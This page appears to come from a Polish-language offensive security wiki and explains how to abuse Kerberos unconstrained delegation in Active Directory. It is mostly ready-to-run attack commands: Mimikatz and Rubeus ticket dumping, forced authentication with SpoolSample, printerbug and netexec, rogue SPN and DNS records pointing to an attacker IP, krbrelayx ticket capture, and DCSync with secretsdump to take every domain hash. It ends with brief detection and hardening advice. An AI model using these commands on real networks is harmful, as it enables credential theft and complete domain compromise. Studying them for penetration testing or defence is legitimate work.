# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

To funkcja, którą administrator domeny może skonfigurować dla dowolnego **komputera** w domenie. Gdy **użytkownik loguje się** na tym komputerze, **kopia TGT** tego użytkownika zostaje **przesłana w ramach TGS** dostarczanego przez DC i **zapisana w pamięci LSASS**. Jeśli więc masz uprawnienia Administratora na tym komputerze, możesz **zrzucić bilety i podszyć się pod użytkowników** na dowolnym komputerze.

Jeśli więc administrator domeny zaloguje się na komputerze z włączoną funkcją „Unconstrained Delegation”, a Ty masz na nim uprawnienia lokalnego administratora, będziesz mógł zrzucić bilet i podszyć się pod administratora domeny w dowolnym miejscu (eskalacja uprawnień w domenie).

Możesz **znaleźć obiekty Computer z tym atrybutem**, sprawdzając, czy atrybut [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) zawiera [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Możesz to zrobić za pomocą filtra LDAP ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, którego używa powerview:

```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```

Załaduj ticket Administratora (lub użytkownika będącego celem) do pamięci za pomocą **Mimikatz** lub **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Więcej informacji: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**Więcej informacji o Unconstrained delegation w ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Wymuszenie uwierzytelnienia**

Jeśli atakujący zdoła **przejąć komputer skonfigurowany do „Unconstrained Delegation”**, może **nakłonić** **serwer wydruku** do **automatycznego zalogowania się** na tym komputerze i **zapisania TGT** w pamięci serwera.\
Następnie atakujący może przeprowadzić **atak Pass the Ticket, aby podszyć się** pod konto komputera serwera wydruku.

Aby skłonić serwer wydruku do zalogowania się na dowolnej maszynie, możesz użyć [**SpoolSample**](https://github.com/leechristensen/SpoolSample):

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

Jeśli TGT pochodzi z kontrolera domeny, możesz przeprowadzić [**atak DCSync**](acl-persistence-abuse/index.html#dcsync) i uzyskać wszystkie hashe z kontrolera domeny.\
[**Więcej informacji o tym ataku znajdziesz na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Poznaj też inne sposoby na **wymuszenie uwierzytelnienia:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Działa również każda inna metoda wymuszania uwierzytelnienia, która sprawia, że ofiara uwierzytelnia się za pomocą **Kerberos** na hoście z unconstrained delegation. W nowoczesnych środowiskach często oznacza to zastąpienie klasycznego przepływu PrinterBug przez wymuszanie uwierzytelnienia za pomocą **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** lub **WebClient/WebDAV** — zależnie od tego, która powierzchnia RPC jest dostępna.

### Wykorzystanie konta użytkownika/usługi z unconstrained delegation

Unconstrained delegation **nie dotyczy wyłącznie obiektów komputerów**. Konto **użytkownika/usługi** również można skonfigurować z flagą `TRUSTED_FOR_DELEGATION`. W takim przypadku praktycznym wymogiem jest to, aby konto otrzymywało bilety usługi Kerberos dla **posiadanego przez nie SPN**.

Prowadzi to do 2 bardzo częstych ścieżek ataku:

1. Przejmujesz hasło/hash konta **użytkownika** z unconstrained delegation, a następnie **dodajesz SPN** do tego samego konta.
2. Konto ma już co najmniej jeden SPN, ale jeden z nich wskazuje na **nieaktualną/wycofaną z użycia nazwę hosta**; odtworzenie brakującego **rekordu DNS A** wystarczy, aby przejąć przepływ uwierzytelniania bez modyfikowania zestawu SPN.<sup>[[8]](#references)</sup>

Minimalny przepływ w systemie Linux:

```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
  secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```

Notatki:

- Jest to szczególnie przydatne, gdy principal bez ograniczeń delegowania jest **kontem usługi**, a masz tylko jego poświadczenia, bez możliwości wykonania kodu na dołączonym do domeny hoście.
- Jeśli docelowy użytkownik ma już **nieaktualny SPN**, odtworzenie odpowiadającego mu **rekordu DNS** może powodować mniej szumu niż zapisanie nowego SPN w AD.
- Współczesne techniki zorientowane na Linuksa wykorzystują `addspn.py`, `dnstool.py`, `krbrelayx.py` oraz jeden mechanizm wymuszania uwierzytelnienia; do przeprowadzenia całego łańcucha nie trzeba korzystać z hosta Windows.

### Nadużywanie Unconstrained Delegation z użyciem komputera utworzonego przez atakującego

Współczesne domeny często mają `MachineAccountQuota > 0` (domyślnie 10), co pozwala każdemu uwierzytelnionemu principalowi utworzyć do N obiektów komputerów. Jeśli masz również uprawnienie tokenu `SeEnableDelegationPrivilege` (lub równoważne prawa), możesz skonfigurować nowo utworzony komputer tak, by był zaufany dla unconstrained delegation, i pozyskiwać przychodzące TGT z uprzywilejowanych systemów.<sup>[[1]](#references)</sup>

Przebieg na wysokim poziomie:

1) Utwórz komputer, nad którym masz kontrolę

```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```

2) Spraw, aby fałszywa nazwa hosta była rozwiązywana w domenie

```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
  --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
  -dns-ip <DC_IP> <DC_FQDN>
```

3) Włącz Unconstrained Delegation na komputerze kontrolowanym przez atakującego

```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```

Dlaczego to działa: przy unconstrained delegation LSA na komputerze z włączoną delegacją buforuje przychodzące TGT. Jeśli nakłonisz kontroler domeny lub uprzywilejowany serwer do uwierzytelnienia się na Twoim fałszywym hoście, jego maszynowy TGT zostanie zapisany i będzie można go wyeksportować.

4) Uruchom krbrelayx w trybie eksportu i przygotuj materiał Kerberos

```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```

5) Wymuś uwierzytelnienie z DC/serwerów do swojego fałszywego hosta

```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```

krbrelayx zapisze pliki ccache, gdy komputer się uwierzytelni, na przykład:

```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```

6) Użyj przechwyconego TGT maszyny DC, aby wykonać DCSync

```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Uwagi i wymagania:

- `MachineAccountQuota > 0` umożliwia nieuprzywilejowanym użytkownikom tworzenie kont komputerów; w przeciwnym razie wymagane są jawne uprawnienia.
- Ustawienie `TRUSTED_FOR_DELEGATION` na koncie komputera wymaga `SeEnableDelegationPrivilege` (lub uprawnień domain admin).
- Zadbaj o rozwiązywanie nazwy na adres twojego fałszywego hosta (rekord DNS A), aby DC mógł się z nim połączyć za pomocą FQDN.
- Wymuszenie uwierzytelnienia wymaga działającego wektora (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN itd.). Jeśli to możliwe, wyłącz te wektory na DC.
- Jeśli konto ofiary ma ustawioną opcję **„Konto jest wrażliwe i nie można go delegować”** lub jest członkiem grupy **Protected Users**, przekazany TGT nie zostanie dołączony do biletu usługi, więc ten łańcuch nie pozwoli uzyskać TGT, którego można ponownie użyć.<sup>[[9]](#references)</sup>
- Jeśli na uwierzytelniającym kliencie/serwerze włączono **Credential Guard**, system Windows blokuje **Kerberos unconstrained delegation**, co może sprawić, że z perspektywy operatora poprawne ścieżki wymuszenia uwierzytelnienia nie zadziałają.

Pomysły na wykrywanie i hardening:

- Generuj alerty dotyczące zdarzenia Event ID 4741 (utworzenie konta komputera) oraz 4742/4738 (zmiana konta komputera/użytkownika), gdy ustawiono `TRUSTED_FOR_DELEGATION` w UAC.
- Monitoruj nietypowe dodawanie rekordów DNS A w strefie domeny.
- Zwracaj uwagę na wzrost liczby zdarzeń 4768/4769 z nieoczekiwanych hostów oraz uwierzytelnianie DC na hostach innych niż DC.
- Ogranicz `SeEnableDelegationPrivilege` do minimalnego zestawu kont, ustaw `MachineAccountQuota=0`, jeśli to możliwe, i wyłącz Print Spooler na DC. Wymuś podpisywanie LDAP i channel binding.

### Ograniczanie ryzyka

- Ogranicz logowania DA/Admin do określonych usług.
- Ustaw opcję „Konto jest wrażliwe i nie można go delegować” dla kont uprzywilejowanych.

## References

- [1] [HTB: Delegate — poświadczenia SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync w celu uzyskania DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Przejęcie domeny przez nieograniczoną delegację](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (fork CME)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation w Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Grupa zabezpieczeń Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Przejęcie domeny przez serwer druku DC i delegację Kerberos](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
{{#include ../../banners/hacktricks-training.md}}
